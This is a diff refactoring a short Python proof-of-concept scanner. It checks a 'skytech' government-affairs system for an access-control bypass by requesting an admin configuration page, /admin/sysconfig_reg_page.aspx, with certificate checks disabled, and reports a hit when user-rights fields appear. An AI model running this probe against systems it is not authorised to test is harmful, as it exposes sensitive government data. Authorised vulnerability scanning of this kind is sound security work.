@@ -9,17 +9,10 @@ description: skytech政务系统越权漏洞,泄露敏感信息。
 import sys
 import requests
 import warnings
-
-
-
-class skytech_bypass_priv:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['skytech政务系统越权漏洞','','']
         payload = "/admin/sysconfig_reg_page.aspx"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
             if r"txtUserRights" in req.text and r"txtTitle" in req.text:
@@ -34,5 +27,5 @@ class skytech_bypass_priv:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = skytech_bypass_priv(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
